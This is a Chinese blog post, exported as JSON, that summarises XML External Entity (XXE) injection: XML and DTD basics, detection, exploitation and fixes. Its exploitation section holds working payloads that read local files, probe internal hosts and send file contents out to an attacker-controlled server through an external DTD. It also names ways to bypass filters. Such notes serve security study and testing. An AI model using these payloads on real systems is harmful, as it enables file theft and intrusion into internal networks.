{"title":"XXE总结","uid":"95bc868529d0f6b6803edcb16b8de2ee","slug":"XXE总结","date":"2022-10-09T11:42:15.000Z","updated":"2022-10-09T11:52:57.526Z","comments":true,"path":"api/articles/XXE总结.json","keywords":null,"cover":"https://www.culture.gouv.fr/var/culture/storage/images/_aliases/reference/media/regions/drac-midi-pyrenees/files/doc-ressources-documentaires/doc-lieux-structures/doc-label-xxe-siecle/logo-patrimoine-xxe/1451401-1-fre-FR/Logo-Patrimoine-XXe.jpg","content":"<h1 id=\"XXE\"><a href=\"#XXE\" class=\"headerlink\" title=\"XXE\"></a>XXE</h1><h2 id=\"XXE基础\"><a href=\"#XXE基础\" class=\"headerlink\" title=\"XXE基础\"></a>XXE基础</h2><p>XXE漏洞全称XML External Entity Injection，即xml外部实体注入了漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>\n<h2 id=\"XML基础\"><a href=\"#XML基础\" class=\"headerlink\" title=\"XML基础\"></a>XML基础</h2><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">XML与HTML的主要区别：\nXML被设计为传输和存储数据，其焦点是数据的内容。\nHTML被设计为用来显示数据，其焦点是数据的外观。\nHTML旨在显示信息，而XML旨在传输信息。</code></pre>\n\n<h2 id=\"DTD\"><a href=\"#DTD\" class=\"headerlink\" title=\"DTD\"></a>DTD</h2><p>文档类型定义（DTD）可定义合法的XML文档构造模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行的声明于XML文档中，也可作为一个外部引用。</p>\n<h3 id=\"内部的DOCTYPE声明\"><a href=\"#内部的DOCTYPE声明\" class=\"headerlink\" title=\"内部的DOCTYPE声明\"></a>内部的DOCTYPE声明</h3><p>例如DTD被包含在您的XML原文件中，它应当通过下面的语法包装在一个DOCTYPE声明中：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></pre>\n\n<h3 id=\"外部文档声明\"><a href=\"#外部文档声明\" class=\"headerlink\" title=\"外部文档声明\"></a>外部文档声明</h3><p>例如DTD位于XML源文件的外部，那么它应通过下面的语法被封装在一个DOCTYPE定义中：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></pre>\n\n<h3 id=\"DTD的作用：\"><a href=\"#DTD的作用：\" class=\"headerlink\" title=\"DTD的作用：\"></a>DTD的作用：</h3><ul>\n<li>通过DTD，你的每一个XML文件均可携带一个有关其自身格式的描述。</li>\n<li>通过DTD，独立的团体可一致地使用某个标准的DTD来交换数据。</li>\n<li>你的应用程序也可使用某个标准的DTD来验证从外部接收到的数据。</li>\n<li>你还可以使用DTD来验证你自身的数据。</li>\n</ul>\n<h2 id=\"实体\"><a href=\"#实体\" class=\"headerlink\" title=\"实体\"></a>实体</h2><p>实体可以理解为变量，其必须在DTD定义申明，可以在文档中的其他位置引起该变量的值。</p>\n<h3 id=\"实体类别：\"><a href=\"#实体类别：\" class=\"headerlink\" title=\"实体类别：\"></a>实体类别：</h3><p>主要有四类：</p>\n<ul>\n<li>内置实体（Built-in entities）</li>\n<li>字符实体（Character entities）</li>\n<li>通用实体（General entities）</li>\n<li>参数实体（Parameter entities）</li>\n</ul>\n<p>实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。</p>\n<p>参数实体用%实体名称申明，引用时也用%实体名称；其余实体直接用实体名称申明，引用时用&amp;实体名称。</p>\n<p>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在Xml文档中引用。</p>\n<p>内部实体：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre>\n\n<p>外部实体：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre>\n\n<p>参数实体：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre>\n\n<h4 id=\"外部实体\"><a href=\"#外部实体\" class=\"headerlink\" title=\"外部实体\"></a>外部实体</h4><p>外部实体即在DTD中使用</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre>\n\n<p>语法引用外部的实体，而非内部实体，那么URL中能写那些类型的外部实体呢？</p>\n<p>主要的有file、http、https、ftp等等。当然不同的程序支持的不一样：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">libxml2：file、http、ftp\n\nPHP：file、http、ftp、php、compress.zlib、compress.bzip2、data、glob、phar\n\nJava：http、https、ftp、file、jar、netdoc、mailto、gopher *\n\n.NET：file、http、https、ftp</code></pre>\n\n<h2 id=\"XXE的检测\"><a href=\"#XXE的检测\" class=\"headerlink\" title=\"XXE的检测\"></a>XXE的检测</h2><p>漏洞的发现可以采用扫描工具有专门的xxe扫描工具，也有综合的工具，还可以通过bp中抓取的数据包信息查询关键字，Content-Type值判断有没有等于text/xml或application/xml的，如果没有也可以手工修改为这两个值，将数据更改为xxe语句，看回显，因为数据包中虽然没有写接受信息类型，但是不说明不存在。</p>\n<p>xxe安全漏洞自动化注射脚本工具XXEinjiector——使用ruby编写，需要安装环境，原理就是payload的fuzz（模糊检测）。</p>\n<p>详细介绍：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;bmjoker&#x2F;p&#x2F;9614990.html</code></pre>\n\n<h3 id=\"白盒\"><a href=\"#白盒\" class=\"headerlink\" title=\"白盒\"></a>白盒</h3><ul>\n<li>函数及可控变量查找</li>\n<li>传输和存储数据格式类型</li>\n</ul>\n<h3 id=\"黑盒\"><a href=\"#黑盒\" class=\"headerlink\" title=\"黑盒\"></a>黑盒</h3><ol>\n<li>人工</li>\n</ol>\n<ul>\n<li>数据格式判断</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;user&gt;test&lt;&#x2F;user&lt;pass&gt;Mikasa&lt;&#x2F;pass&gt;</code></pre>\n\n<ul>\n<li>Content-Type值判断</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">text&#x2F;xml\napplication&#x2F;xml</code></pre>\n\n<ul>\n<li>更改Content-Type值看返回</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">就是通过修改成这两个\ntext&#x2F;xml\napplication&#x2F;xml</code></pre>\n\n<ol start=\"2\">\n<li>工具</li>\n</ol>\n<h2 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h2><h3 id=\"输出形式\"><a href=\"#输出形式\" class=\"headerlink\" title=\"输出形式\"></a>输出形式</h3><ol>\n<li>有回显</li>\n</ol>\n<ul>\n<li>协议玩法</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http\nfile\n各脚本支持协议，就是上面列出来的编写外部实体的协议</code></pre>\n\n<ul>\n<li>外部引用</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\"># 玩法-读文件\n&lt;?xml version &#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;d:&#x2F;&#x2F;test.txt&quot;&gt;\n]&gt;\n&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;\n\n# 玩法-内网探针或攻击内网应用（触发漏洞地址）不常见\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY&gt;\n&lt;!ENTITY rabbit SYSTEM &quot;http:&#x2F;&#x2F;192.168.1.1:8080&#x2F;index.txt&quot;&gt;\n]&gt;\n&lt;x&gt;&amp;rabbit;&lt;&#x2F;x&gt;\n通过有xxe的漏洞网站，向其服务器内网进行判断192.168.1.1的8080端口是否开放，并且index.txt文件是否存在\n\n引入外部实体dtd——主要的作用是自定义攻击，但是前提条件是对方网站没有禁止引入外部实体\n&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE test [\n&lt;!ENTITY %file SYSTEM &quot;http:&#x2F;&#x2F;127.0.1.1:8080&#x2F;evil2.dtd&quot;&gt;#url只想自己公网IP\n%file;\n]&gt;\n&lt;x&gt;&amp;send;&lt;&#x2F;x&gt;\n\ndtd文件会被当做xml文件执行\n所以在自己服务器上写上相应的代码即可 evil2.dtd:&lt;!ENTITY send SYTEM &quot;file:&#x2F;&#x2F;&#x2F;d:&#x2F;test.txt&quot;&gt;</code></pre>\n\n<ol start=\"2\">\n<li>无回显</li>\n</ol>\n<ul>\n<li>外部引用-反向链接配合</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\"># 读取文件\n有时网站代码中设置了不回显，可以通过向自己服务器发送数据来查看到信息，一种是看日志信息，一种是将传递进来的数据直接写入到文件中。\n&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE test [\n&lt;!ENTITY %file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;d:&#x2F;test.txt&quot;&gt;\n#用上面这行代码的情况下不写文件的绝对路径也能正常搜寻，只不过是在当前路径下，而在file的话就要写全路径\n&lt;!ENTITY %dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.103:8080&#x2F;test.dtd&quot;&gt;\n%dtd;\n%send;\n]&gt;\n服务器中test.dtd文件代码：\n&lt;!ENTITY %payload\n&quot;&lt;ENTITY &amp;#x25; send SYSTEM\n&#39;http:&#x2F;&#x2F;192.168.0.103:8080&#x2F;?data&#x3D;%file;&#39;&gt;&quot;\n&gt;\n&amp;payload;</code></pre>\n\n<h3 id=\"过滤绕过\"><a href=\"#过滤绕过\" class=\"headerlink\" title=\"过滤绕过\"></a>过滤绕过</h3><ol>\n<li>协议玩法</li>\n</ol>\n<p>比如http协议被过滤可以采用其他的协议方法绕过</p>\n<ol start=\"2\">\n<li><p>外部引用</p>\n</li>\n<li><p>编码UTF-16BE</p>\n</li>\n</ol>\n<p>详细可参考：<a href=\"https://www.cnblogs.com/20175211lyz/p/11413335.html\">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p>\n<h2 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h2><ol>\n<li>禁用外部实体引用</li>\n<li>过滤关键字</li>\n<li>WAF产品</li>\n</ol>\n","text":"XXEXXE基础XXE漏洞全称XML External Entity Injection，即xml外部实体注入了漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。 XML基础X...","link":"","photos":[],"count_time":{"symbolsCount":"3.8k","symbolsTime":"3 mins."},"categories":[{"name":"XXE","slug":"XXE","count":1,"path":"api/categories/XXE.json"}],"tags":[{"name":"XXE","slug":"XXE","count":1,"path":"api/tags/XXE.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#XXE\"><span class=\"toc-text\">XXE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XXE%E5%9F%BA%E7%A1%80\"><span class=\"toc-text\">XXE基础</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XML%E5%9F%BA%E7%A1%80\"><span class=\"toc-text\">XML基础</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#DTD\"><span class=\"toc-text\">DTD</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%86%85%E9%83%A8%E7%9A%84DOCTYPE%E5%A3%B0%E6%98%8E\"><span class=\"toc-text\">内部的DOCTYPE声明</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A4%96%E9%83%A8%E6%96%87%E6%A1%A3%E5%A3%B0%E6%98%8E\"><span class=\"toc-text\">外部文档声明</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DTD%E7%9A%84%E4%BD%9C%E7%94%A8%EF%BC%9A\"><span class=\"toc-text\">DTD的作用：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BD%93\"><span class=\"toc-text\">实体</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BD%93%E7%B1%BB%E5%88%AB%EF%BC%9A\"><span class=\"toc-text\">实体类别：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93\"><span class=\"toc-text\">外部实体</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XXE%E7%9A%84%E6%A3%80%E6%B5%8B\"><span class=\"toc-text\">XXE的检测</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%99%BD%E7%9B%92\"><span class=\"toc-text\">白盒</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%BB%91%E7%9B%92\"><span class=\"toc-text\">黑盒</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">利用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BE%93%E5%87%BA%E5%BD%A2%E5%BC%8F\"><span class=\"toc-text\">输出形式</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">过滤绕过</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%AE%E5%A4%8D\"><span class=\"toc-text\">修复</span></a></li></ol></li></ol>","author":{"name":"kiku","slug":"blog-author","avatar":"https://samedi.gitee.io/favicon.png","link":"/","description":"网络运维,linux运维,web渗透","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"hexo博客搭建","uid":"c4cba91c1e0b379daa43b604daad3f91","slug":"搭建博客","date":"2022-10-11T15:04:00.196Z","updated":"2022-10-24T07:36:36.472Z","comments":true,"path":"api/articles/搭建博客.json","keywords":null,"cover":"https://img-blog.csdnimg.cn/0c9294ae04d740359770d8bef1f3c48e.png","text":"搭建的博客所参考的blog博客搭建 | 月夜烛魂 (gitee.io) 新建文章：hexo new p 文件名 专科时搭建的博客，当时根目录在U盘，U盘丢了，懒得再复原了，就又重新搭建了一个，但是途中遇到了问题，以下是找到的一些解决办法。 (1条消息) git@github.co...","link":"","photos":[],"count_time":{"symbolsCount":685,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"kiku","slug":"blog-author","avatar":"https://samedi.gitee.io/favicon.png","link":"/","description":"网络运维,linux运维,web渗透","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{}}